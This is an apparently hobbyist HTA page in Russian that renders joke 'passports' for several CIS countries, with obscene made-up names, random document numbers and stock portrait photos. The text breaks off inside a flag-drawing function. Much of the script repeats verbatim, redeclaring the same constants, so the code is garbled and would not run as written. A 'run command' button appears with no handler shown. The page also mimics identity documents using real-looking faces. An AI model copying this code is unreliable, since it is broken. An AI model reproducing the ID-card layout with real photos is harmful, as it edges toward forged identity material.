<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Генератор ФИО с паспортом</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=PT+Serif:wght@400;700&family=Roboto:wght@400;700&display=swap');
    body {
      font-family: 'PT Serif', 'Roboto', 'Segoe UI', 'Arial', serif;
      background: #f6f7fa;
      color: #222;
      min-height: 100vh;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .box {
      background: #fff;
      padding: 28px 24px 18px 24px;
      border-radius: 16px;
      box-shadow: 0 4px 24px #0001;
      text-align: center;
      width: 380px;
      border: 1px solid #e3e7ee;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    button {
      padding: 12px 0;
      font-size: 16px;
      font-family: inherit;
      background: #0052a4;
      color: #fff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 16px;
      width: 100%;
      box-shadow: 0 2px 8px #0002;
      transition: background 0.2s, transform 0.2s;
      font-weight: 500;
      outline: none;
      letter-spacing: 0.5px;
    }
    button:hover {
      background: #0074d9;
      transform: scale(1.03);
    }
    #canvas {
      margin-top: 14px;
      border-radius: 10px;
      box-shadow: 0 2px 12px #0052a422;
      background: #f6f7fa;
      display: block;
      margin-left: auto;
      margin-right: auto;
      border: 1px solid #e3e7ee;
      width: 340px;
      height: 560px;
      max-width: 100%;
    }
  </style>
  <hta:application
    applicationname="FioGen"
    border="thin"
    caption="yes"
    maximizebutton="no"
    minimizebutton="yes"
    showintaskbar="yes"
    singleinstance="yes"
    sysmenu="yes"
    windowstate="normal"
  />
</head>
<body>
  <div class="box">
    <canvas id="canvas" width="340" height="560"></canvas>
    <button onclick="generate()">Сгенерировать</button>
    <button id="runCmdBtn">Запустить команду</button>
    <button onclick="savePng()">Сохранить PNG</button>
  </div>
  <script type="text/javascript">
    // Расширенный список ФИО (мужские, женские, кринжовые, рофельные)
    const fn = [
      "Штырь", "Карасиков", "Корзиночкин", "Сычев", "Дроздов", "Головач", "Бутырин", "Писарь", "Ерохин", "Лакец", "Шпак", "Шлепов", "Накатин", "Душин", "Драпов", "Засратов", "Глистов", "Железняк", "Чуркин", "Фекалов", "Ноздря", "Шорин", "Перделкин", "Хлюпин", "Окунев", "Вшивцев", "Уколов", "Дрочунов", "Выпуклов", "Казьмин", "Хряпов", "Парашюков", "Пузырев", "Жрунов", "Шариков", "Клещев", "Обожратов", "Плавников", "Раздолбаев", "Кряков", "Умников", "Медунин", "Козлодоев", "Залеткин", "Сурков", "Печенегов", "Панасенков", "Ушаков",
      "Пельменев", "Бомжев", "Кринжов", "Рофлянов", "Уебанский", "Потаскухин", "Говняков", "Петросян", "Бузов", "Дуремаров", "Петухов", "Баранов", "Козлов", "Собачкин", "Котиков", "Пельменева", "Бомжева", "Кринжова", "Рофлянова", "Уебанская", "Потаскухина", "Говнякова", "Дуремарова", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова"
    ];
    const nm = [
      "Аркадий", "Семен", "Абу", "Илья", "Изаил", "Назар", "Акакий", "Денис", "Жора", "Арсен", "Павел", "Марк", "Федор", "Феликс", "Олег", "Антон", "Ян", "Богдан", "Мстислав", "Роман", "Юрий", "Игорь", "Давид", "Альберт", "Григорий", "Глеб", "Никита", "Анатолий", "Эдуард", "Василий",
      "Валера", "Серега", "Виталя", "Вован", "Женя", "Петя", "Вася", "Саша", "Коля", "Дима", "Гена", "Леха", "Паша", "Степан", "Гоша", "Витя", "Влад", "Слава", "Валентин", "Валентин", "Валентин",
      "Мария", "Оксана", "Светлана", "Анастасия", "Екатерина", "Виктория", "Татьяна", "Ольга", "Наталья", "Юлия", "Елена", "Галина", "Людмила", "Ирина", "Анна", "Кринжина", "Рофляна", "Уебанка", "Потаскуха", "Бузова", "Дуремара", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова"
    ];
    const pt = [
      "Семеныч", "Акакиевич", "Изаилыч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
      "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович",
      "Мариевна", "Оксановна", "Светлановна", "Анастасиевна", "Екатериновна", "Викторовна", "Татьяновна", "Ольговна", "Натальевна", "Юлиевна", "Еленовна", "Галиновна", "Людмиловна", "Ириновна", "Анновна", "Кринжевна", "Рофляновна", "Уебановна", "Потаскуховна", "Бузовна", "Дуремаровна", "Петуховна", "Барановна", "Козловна", "Собачкина", "Котиковна"
    ];

    // Список полов
    const genders = [
      { label: "Мужской", value: "M" },
      { label: "Женский", value: "F" },
      { label: "Кринж", value: "K" },
      { label: "Рофл", value: "R" },
      { label: "Уебанский", value: "U" }
    ];

    // IRL-фотки (только реальные лица, без svg)
    const photos = [
      "https://randomuser.me/api/portraits/men/1.jpg",
      "https://randomuser.me/api/portraits/women/2.jpg",
      "https://randomuser.me/api/portraits/men/3.jpg",
      "https://randomuser.me/api/portraits/women/4.jpg",
      "https://randomuser.me/api/portraits/men/5.jpg",
      "https://randomuser.me/api/portraits/women/6.jpg",
      "https://randomuser.me/api/portraits/men/7.jpg",
      "https://randomuser.me/api/portraits/women/8.jpg",
      "https://randomuser.me/api/portraits/men/9.jpg",
      "https://randomuser.me/api/portraits/women/10.jpg",
      "https://randomuser.me/api/portraits/men/11.jpg",
      "https://randomuser.me/api/portraits/women/12.jpg",
      "https://randomuser.me/api/portraits/men/13.jpg",
      "https://randomuser.me/api/portraits/women/14.jpg",
      "https://randomuser.me/api/portraits/men/15.jpg",
      "https://randomuser.me/api/portraits/women/16.jpg"
    ];

    // Дополнительные поля паспорта
    function randomBirthDate() {
      const year = 1970 + Math.floor(Math.random() * 35);
      const month = String(1 + Math.floor(Math.random() * 12)).padStart(2, '0');
      const day = String(1 + Math.floor(Math.random() * 28)).padStart(2, '0');
      return `${day}.${month}.${year}`;
    }
    function randomPlace() {
      const places = [
        "г. Москва", "г. Санкт-Петербург", "г. Киев", "г. Минск", "г. Алматы", "г. Ереван", "г. Кишинёв", "г. Ташкент", "г. Бишкек", "г. Душанбе",
        "г. Владивосток", "г. Ростов-на-Дону", "г. Самара", "г. Новосибирск", "г. Казань", "г. Харьков", "г. Одесса", "г. Гомель", "г. Баку"
      ];
      return getRandom(places);
    }
    function randomAddress() {
      const streets = [
        "ул. Ленина, д. 1", "ул. Гагарина, д. 7", "пр. Победы, д. 12", "ул. Пушкина, д. 5", "ул. Кринжа, д. 13", "ул. Рофла, д. 42", "ул. Уебанская, д. 666"
      ];
      return `${randomPlace()}, ${getRandom(streets)}`;
    }
    function randomDocNum() {
      return String(Math.floor(100000000 + Math.random() * 900000000));
    }

    function getRandom(arr) {
      return arr[Math.floor(Math.random() * arr.length)];
    }

    function generatePassport(country) {
      const series = country.series();
      const number = country.number();
      const issuer = getRandom(country.issuer);
      const date = `${String(Math.floor(1 + Math.random()*28)).padStart(2,'0')}.${String(Math.floor(1 + Math.random()*12)).padStart(2,'0')}.${2005 + Math.floor(Math.random()*10)}`;
      return {series, number, issuer, date};
    }

    // ФИО по полу
    const fn_male = [
      "Штырь", "Карасиков", "Корзиночкин", "Сычев", "Дроздов", "Головач", "Бутырин", "Писарь", "Ерохин", "Лакец", "Шпак", "Шлепов", "Накатин", "Душин", "Драпов", "Засратов", "Глистов", "Железняк", "Чуркин", "Фекалов", "Ноздря", "Шорин", "Перделкин", "Хлюпин", "Окунев", "Вшивцев", "Уколов", "Дрочунов", "Выпуклов", "Казьмин", "Хряпов", "Парашюков", "Пузырев", "Жрунов", "Шариков", "Клещев", "Обожратов", "Плавников", "Раздолбаев", "Кряков", "Умников", "Медунин", "Козлодоев", "Залеткин", "Сурков", "Печенегов", "Панасенков", "Ушаков", "Пельменев", "Бомжев", "Кринжов", "Рофлянов", "Уебанский", "Потаскухин", "Говняков", "Петросян", "Бузов", "Дуремаров", "Петухов", "Баранов", "Козлов", "Собачкин", "Котиков"
    ];
    const nm_male = [
      "Аркадий", "Семен", "Абу", "Илья", "Изаил", "Назар", "Акакий", "Денис", "Жора", "Арсен", "Павел", "Марк", "Федор", "Феликс", "Олег", "Антон", "Ян", "Богдан", "Мстислав", "Роман", "Юрий", "Игорь", "Давид", "Альберт", "Григорий", "Глеб", "Никита", "Анатолий", "Эдуард", "Василий", "Валера", "Серега", "Виталя", "Вован", "Женя", "Петя", "Вася", "Саша", "Коля", "Дима", "Гена", "Леха", "Паша", "Степан", "Гоша", "Витя", "Влад", "Слава", "Валентин"
    ];
    const pt_male = [
      "Акакиевич", "Изаилыч", "Семеныч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
      "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович"
    ];

    const fn_female = [
      "Пельменева", "Бомжева", "Кринжова", "Рофлянова", "Уебанская", "Потаскухина", "Говнякова", "Дуремарова", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова", "Бузова", "Дуремара", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова"
    ];
    const nm_female = [
      "Мария", "Оксана", "Светлана", "Анастасия", "Екатерина", "Виктория", "Татьяна", "Ольга", "Наталья", "Юлия", "Елена", "Галина", "Людмила", "Ирина", "Анна", "Кринжина", "Рофляна", "Уебанка", "Потаскуха"
    ];
    const pt_female = [
      "Мариевна", "Оксановна", "Светлановна", "Анастасиевна", "Екатериновна", "Викторовна", "Татьяновна", "Ольговна", "Натальевна", "Юлиевна", "Еленовна", "Галиновна", "Людмиловна", "Ириновна", "Анновна", "Кринжевна", "Рофляновна", "Уебановна", "Потаскуховна"
    ];

    // IRL-фотки (только реальные лица)
    const photos_male = [
      // Используем API для генерации реалистичных лиц
      "https://thispersondoesnotexist.com/image?" + Math.random(),
      "https://100k-faces.glitch.me/random-image?" + Math.random(),
      "https://randomuser.me/api/portraits/men/1.jpg",
      "https://randomuser.me/api/portraits/men/3.jpg",
      "https://randomuser.me/api/portraits/men/5.jpg",
      "https://randomuser.me/api/portraits/men/7.jpg",
      "https://randomuser.me/api/portraits/men/9.jpg",
      "https://randomuser.me/api/portraits/men/11.jpg",
      "https://randomuser.me/api/portraits/men/13.jpg",
      "https://randomuser.me/api/portraits/men/15.jpg"
    ];
    const photos_female = [
      "https://randomuser.me/api/portraits/women/2.jpg",
      "https://randomuser.me/api/portraits/women/4.jpg",
      "https://randomuser.me/api/portraits/women/6.jpg",
      "https://randomuser.me/api/portraits/women/8.jpg",
      "https://randomuser.me/api/portraits/women/10.jpg",
      "https://randomuser.me/api/portraits/women/12.jpg",
      "https://randomuser.me/api/portraits/women/14.jpg",
      "https://randomuser.me/api/portraits/women/16.jpg"
    ];

    // Дополнительные поля паспорта
    function randomBirthDate() {
      const year = 1970 + Math.floor(Math.random() * 35);
      const month = String(1 + Math.floor(Math.random() * 12)).padStart(2, '0');
      const day = String(1 + Math.floor(Math.random() * 28)).padStart(2, '0');
      return `${day}.${month}.${year}`;
    }
    function randomPlace() {
      const places = [
        "г. Москва", "г. Санкт-Петербург", "г. Киев", "г. Минск", "г. Алматы", "г. Ереван", "г. Кишинёв", "г. Ташкент", "г. Бишкек", "г. Душанбе",
        "г. Владивосток", "г. Ростов-на-Дону", "г. Самара", "г. Новосибирск", "г. Казань", "г. Харьков", "г. Одесса", "г. Гомель", "г. Баку"
      ];
      return getRandom(places);
    }
    function randomAddress() {
      const streets = [
        "ул. Ленина, д. 1", "ул. Гагарина, д. 7", "пр. Победы, д. 12", "ул. Пушкина, д. 5", "ул. Кринжа, д. 13", "ул. Рофла, д. 42", "ул. Уебанская, д. 666"
      ];
      return `${randomPlace()}, ${getRandom(streets)}`;
    }
    function randomDocNum() {
      return String(Math.floor(100000000 + Math.random() * 900000000));
    }

    function getRandom(arr) {
      return arr[Math.floor(Math.random() * arr.length)];
    }

    function generatePassport(country) {
      const series = country.series();
      const number = country.number();
      const issuer = getRandom(country.issuer);
      const date = `${String(Math.floor(1 + Math.random()*28)).padStart(2,'0')}.${String(Math.floor(1 + Math.random()*12)).padStart(2,'0')}.${2005 + Math.floor(Math.random()*10)}`;
      return {series, number, issuer, date};
    }

    // ФИО по полу
    const fn_male = [
      "Штырь", "Карасиков", "Корзиночкин", "Сычев", "Дроздов", "Головач", "Бутырин", "Писарь", "Ерохин", "Лакец", "Шпак", "Шлепов", "Накатин", "Душин", "Драпов", "Засратов", "Глистов", "Железняк", "Чуркин", "Фекалов", "Ноздря", "Шорин", "Перделкин", "Хлюпин", "Окунев", "Вшивцев", "Уколов", "Дрочунов", "Выпуклов", "Казьмин", "Хряпов", "Парашюков", "Пузырев", "Жрунов", "Шариков", "Клещев", "Обожратов", "Плавников", "Раздолбаев", "Кряков", "Умников", "Медунин", "Козлодоев", "Залеткин", "Сурков", "Печенегов", "Панасенков", "Ушаков", "Пельменев", "Бомжев", "Кринжов", "Рофлянов", "Уебанский", "Потаскухин", "Говняков", "Петросян", "Бузов", "Дуремаров", "Петухов", "Баранов", "Козлов", "Собачкин", "Котиков"
    ];
    const nm_male = [
      "Аркадий", "Семен", "Абу", "Илья", "Изаил", "Назар", "Акакий", "Денис", "Жора", "Арсен", "Павел", "Марк", "Федор", "Феликс", "Олег", "Антон", "Ян", "Богдан", "Мстислав", "Роман", "Юрий", "Игорь", "Давид", "Альберт", "Григорий", "Глеб", "Никита", "Анатолий", "Эдуард", "Василий", "Валера", "Серега", "Виталя", "Вован", "Женя", "Петя", "Вася", "Саша", "Коля", "Дима", "Гена", "Леха", "Паша", "Степан", "Гоша", "Витя", "Влад", "Слава", "Валентин"
    ];
    const pt_male = [
      "Акакиевич", "Изаилыч", "Семеныч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
      "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович"
    ];

    const fn_female = [
      "Пельменева", "Бомжева", "Кринжова", "Рофлянова", "Уебанская", "Потаскухина", "Говнякова", "Дуремарова", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова", "Бузова", "Дуремара", "Петухова", "Баранова", "Козлова", "Собачкина", "Котикова"
    ];
    const nm_female = [
      "Мария", "Оксана", "Светлана", "Анастасия", "Екатерина", "Виктория", "Татьяна", "Ольга", "Наталья", "Юлия", "Елена", "Галина", "Людмила", "Ирина", "Анна", "Кринжина", "Рофляна", "Уебанка", "Потаскуха"
    ];
    const pt_female = [
      "Мариевна", "Оксановна", "Светлановна", "Анастасиевна", "Екатериновна", "Викторовна", "Татьяновна", "Ольговна", "Натальевна", "Юлиевна", "Еленовна", "Галиновна", "Людмиловна", "Ириновна", "Анновна", "Кринжевна", "Рофляновна", "Уебановна", "Потаскуховна"
    ];

    // IRL-фотки (только реальные лица)
    const photos_male = [
      // Используем API для генерации реалистичных лиц
      "https://thispersondoesnotexist.com/image?" + Math.random(),
      "https://100k-faces.glitch.me/random-image?" + Math.random(),
      "https://randomuser.me/api/portraits/men/1.jpg",
      "https://randomuser.me/api/portraits/men/3.jpg",
      "https://randomuser.me/api/portraits/men/5.jpg",
      "https://randomuser.me/api/portraits/men/7.jpg",
      "https://randomuser.me/api/portraits/men/9.jpg",
      "https://randomuser.me/api/portraits/men/11.jpg",
      "https://randomuser.me/api/portraits/men/13.jpg",
      "https://randomuser.me/api/portraits/men/15.jpg"
    ];
    const photos_female = [
      "https://randomuser.me/api/portraits/women/2.jpg",
      "https://randomuser.me/api/portraits/women/4.jpg",
      "https://randomuser.me/api/portraits/women/6.jpg",
      "https://randomuser.me/api/portraits/women/8.jpg",
      "https://randomuser.me/api/portraits/women/10.jpg",
      "https://randomuser.me/api/portraits/women/12.jpg",
      "https://randomuser.me/api/portraits/women/14.jpg",
      "https://randomuser.me/api/portraits/women/16.jpg"
    ];

    // Дополнительные поля паспорта
    function randomBirthDate() {
      const year = 1970 + Math.floor(Math.random() * 35);
      const month = String(1 + Math.floor(Math.random() * 12)).padStart(2, '0');
      const day = String(1 + Math.floor(Math.random() * 28)).padStart(2, '0');
      return `${day}.${month}.${year}`;
    }
    function randomPlace() {
      const places = [
        "г. Москва", "г. Санкт-Петербург", "г. Киев", "г. Минск", "г. Алматы", "г. Ереван", "г. Кишинёв", "г. Ташкент", "г. Бишкек", "г. Душанбе",
        "г. Владивосток", "г. Ростов-на-Дону", "г. Самара", "г. Новосибирск", "г. Казань", "г. Харьков", "г. Одесса", "г. Гомель", "г. Баку"
      ];
      return getRandom(places);
    }
    function randomAddress() {
      const streets = [
        "ул. Ленина, д. 1", "ул. Гагарина, д. 7", "пр. Победы, д. 12", "ул. Пушкина, д. 5", "ул. Кринжа, д. 13", "ул. Рофла, д. 42", "ул. Уебанская, д. 666"
      ];
      return `${randomPlace()}, ${getRandom(streets)}`;
    }
    function randomDocNum() {
      return String(Math.floor(100000000 + Math.random() * 900000000));
    }

    function getRandom(arr) {
      return arr[Math.floor(Math.random() * arr.length)];
    }

    function generatePassport(country) {
      const series = country.series();
      const number = country.number();
      const issuer = getRandom(country.issuer);
      const date = `${String(Math.floor(1 + Math.random()*28)).padStart(2,'0')}.${String(Math.floor(1 + Math.random()*12)).padStart(2,'0')}.${2005 + Math.floor(Math.random()*10)}`;
      return {series, number, issuer, date};
    }

    // Добавляем массив стран, который отсутствовал
    const countries = [
      {
        name: "Россия",
        color: "#a52a2a",
        bg: "#f9f6ee", 
        border: "#b0a090",
        title: "РОССИЙСКАЯ ФЕДЕРАЦИЯ",
        doc: "ПАСПОРТ",
        seal: "Печать",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "ОВД Краснознаменска", "ГУ МВД по г. Москве", "УФМС по Ростовской обл.",
          "ГУВМ МВД по Приморскому краю", "МВД России по Чечне"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#a52a2a";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#a52a2a"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Украина",
        color: "#0057b7",
        bg: "#ffd700",
        border: "#0033a0",
        title: "УКРАИНА",
        doc: "ПАСПОРТ",
        seal: "Державна печатка",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "ДМС Украины", "ГУ МВД Украины", "Управление миграционной службы",
          "Посольство Украины", "Консульство Украины"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#0057b7";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#0057b7"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Беларусь",
        color: "#d52b1e",
        bg: "#00923f",
        border: "#ffffff",
        title: "РЕСПУБЛИКА БЕЛАРУСЬ",
        doc: "ПАСПОРТ",
        seal: "Герб",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "Управление по гражданству и миграции", "Посольство Беларуси",
          "Консульство Беларуси", "МВД Республики Беларусь"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#d52b1e";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#d52b1e"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Казахстан",
        color: "#00bfff",
        bg: "#0033a0",
        border: "#ffffff",
        title: "КАЗАХСТАН",
        doc: "ПАСПОРТ",
        seal: "Миллет печаты",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "Министерство внутренних дел РК", "Посольство Казахстана",
          "Консульство Казахстана"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#00bfff";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#00bfff"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Армения",
        color: "#d80027",
        bg: "#ffb400",
        border: "#0033a0",
        title: "АРМЕНИЯ",
        doc: "ПАСПОРТ",
        seal: "Պաստառ",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "Министерство внутренних дел Армении", "Посольство Армении",
          "Консульство Армении"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#d80027";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#d80027"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Молдова",
        color: "#0033a0",
        bg: "#ffd700",
        border: "#d52b1e",
        title: "РЕСПУБЛИКА МОЛДОВА",
        doc: "ПАСПОРТ",
        seal: "Герб",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "Генеральный инспекторат полиции", "Посольство Молдовы",
          "Консульство Молдовы"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#0033a0";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#0033a0"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Узбекистан",
        color: "#0099ff",
        bg: "#43a047",
        border: "#ffffff",
        title: "УЗБЕКИСТАН",
        doc: "ПАСПОРТ",
        seal: "Давлат мўйиз",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "Министерство внутренних дел Узбекистана", "Посольство Узбекистана",
          "Консульство Узбекистана"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#0099ff";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#0099ff"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Киргизия",
        color: "#e81123",
        bg: "#ffffff",
        border: "#008000",
        title: "КЫРГЫЗСТАН",
        doc: "ПАСПОРТ",
        seal: "Мамлекеттик мөөр",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "Министерство внутренних дел Кыргызстана", "Посольство Кыргызстана",
          "Консульство Кыргызстана"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#e81123";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#e81123"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      },
      {
        name: "Таджикистан",
        color: "#d52b1e",
        bg: "#008000",
        border: "#ffffff",
        title: "ТАДЖИКИСТАН",
        doc: "ПАСПОРТ",
        seal: "Мӯҳри давлатӣ",
        series: () => String(Math.floor(1000 + Math.random() * 9000)),
        number: () => String(Math.floor(100000 + Math.random() * 900000)),
        issuer: [
          "Министерство внутренних дел Таджикистана", "Посольство Таджикистана",
          "Консульство Таджикистана"
        ],
        sealDraw: function(ctx, x, y) {
          ctx.beginPath();
          ctx.arc(x, y, 18, 0, 2*Math.PI);
          ctx.strokeStyle = "#d52b1e";
          ctx.lineWidth = 2;
          ctx.stroke();
          ctx.font = "10px 'Segoe UI', Arial";
          ctx.fillStyle = "#d52b1e"; 
          ctx.fillText("Печать", x-16, y+6);
        }
      }
    ];

    // Определение пола по ФИО
    function pickGender() {
      return Math.random() < 0.5 ? "male" : "female";
    }

    // Реальные фото + генерация лиц
    function getRandomPhoto(gender) {
      // Только реальные фото для CORS
      const realPhotos = gender === "male"
        ? [
            "https://randomuser.me/api/portraits/men/1.jpg",
            "https://randomuser.me/api/portraits/men/3.jpg",
            "https://randomuser.me/api/portraits/men/5.jpg",
            "https://randomuser.me/api/portraits/men/7.jpg",
            "https://randomuser.me/api/portraits/men/9.jpg",
            "https://randomuser.me/api/portraits/men/11.jpg",
            "https://randomuser.me/api/portraits/men/13.jpg",
            "https://randomuser.me/api/portraits/men/15.jpg"
          ]
        : [
            "https://randomuser.me/api/portraits/women/2.jpg",
            "https://randomuser.me/api/portraits/women/4.jpg",
            "https://randomuser.me/api/portraits/women/6.jpg",
            "https://randomuser.me/api/portraits/women/8.jpg",
            "https://randomuser.me/api/portraits/women/10.jpg",
            "https://randomuser.me/api/portraits/women/12.jpg",
            "https://randomuser.me/api/portraits/women/14.jpg",
            "https://randomuser.me/api/portraits/women/16.jpg"
          ];
      return realPhotos[Math.floor(Math.random() * realPhotos.length)];
    }

    // Отчества по полу
    const pt_male = [
      "Акакиевич", "Изаилыч", "Семеныч", "Ерохович", "Пахомыч", "Борисович", "Ибрагимович", "Штирлицович", "Георгиевич", "Олегович", "Романович", "Ярославович", "Львович", "Фомич", "Артемович", "Геннадьевич", "Данилович",
      "Валериевич", "Сергеевич", "Витальевич", "Вованович", "Женевич", "Петевич", "Васильевич", "Сашевич", "Колевич", "Димович", "Геннадьевич", "Лехович", "Пашевич", "Степанович", "Гошевич", "Витальевич", "Владович", "Славович"
    ];
    const pt_female = [
      "Мариевна", "Оксановна", "Светлановна", "Анастасиевна", "Екатериновна", "Викторовна", "Татьяновна", "Ольговна", "Натальевна", "Юлиевна", "Еленовна", "Галиновна", "Людмиловна", "Ириновна", "Анновна", "Кринжевна", "Рофляновна", "Уебановна", "Потаскуховна"
    ];

    function pickGender() {
      return Math.random() < 0.5 ? "male" : "female";
    }

    function pickPatronymic(name, gender) {
      // Если имя женское — женское отчество, если мужское — мужское, если смешанное — случайное
      const femaleNames = nm_female;
      const maleNames = nm_male;
      if (femaleNames.includes(name)) {
        return getRandom(pt_female);
      } else if (maleNames.includes(name)) {
        return getRandom(pt_male);
      } else {
        return gender === "male" ? getRandom(pt_male) : getRandom(pt_female);
      }
    }

    function getRandomPhoto(gender) {
      // Только реальные фото для CORS
      const realPhotos = gender === "male"
        ? [
            "https://randomuser.me/api/portraits/men/1.jpg",
            "https://randomuser.me/api/portraits/men/3.jpg",
            "https://randomuser.me/api/portraits/men/5.jpg",
            "https://randomuser.me/api/portraits/men/7.jpg",
            "https://randomuser.me/api/portraits/men/9.jpg",
            "https://randomuser.me/api/portraits/men/11.jpg",
            "https://randomuser.me/api/portraits/men/13.jpg",
            "https://randomuser.me/api/portraits/men/15.jpg"
          ]
        : [
            "https://randomuser.me/api/portraits/women/2.jpg",
            "https://randomuser.me/api/portraits/women/4.jpg",
            "https://randomuser.me/api/portraits/women/6.jpg",
            "https://randomuser.me/api/portraits/women/8.jpg",
            "https://randomuser.me/api/portraits/women/10.jpg",
            "https://randomuser.me/api/portraits/women/12.jpg",
            "https://randomuser.me/api/portraits/women/14.jpg",
            "https://randomuser.me/api/portraits/women/16.jpg"
          ];
      return realPhotos[Math.floor(Math.random() * realPhotos.length)];
    }

    function generate() {
      const country = getRandom(countries);
      const gender = pickGender();
      let fnVal, nmVal, ptVal, full;
      if (gender === "male") {
        fnVal = getRandom(fn_male);
        nmVal = getRandom(nm_male);
        ptVal = pickPatronymic(nmVal, "male");
      } else {
        fnVal = getRandom(fn_female);
        nmVal = getRandom(nm_female);
        ptVal = pickPatronymic(nmVal, "female");
      }
      full = `${fnVal} ${nmVal} ${ptVal}`;
      const photoUrl = getRandomPhoto(gender);
      const passport = generatePassport(country);
      const birthDate = randomBirthDate();
      const birthPlace = randomPlace();
      const address = randomAddress();
      const docNum = randomDocNum();

      // Предзагрузка изображения
      const img = new window.Image();
      img.crossOrigin = "anonymous";
      img.onload = function() {
        drawPassportPages({
          country, full, passport, gender, photoUrl: img,
          birthDate, birthPlace, address, docNum
        });
      };
      img.onerror = function() {
        drawPassportPages({
          country, full, passport, gender, photoUrl: null,
          birthDate, birthPlace, address, docNum
        });
      };
      img.src = photoUrl;
    }

    // Флаг
    function drawFlag(ctx, country, x, y, w, h) {
      // Примитивные флаги для примера
      if (country.name === "Россия") {
        ctx.fillStyle = "#fff"; ctx.fillRect(x, y, w, h/3);
        ctx.fillStyle = "#0033a0"; ctx.fillRect(x, y+h/3, w, h/3);
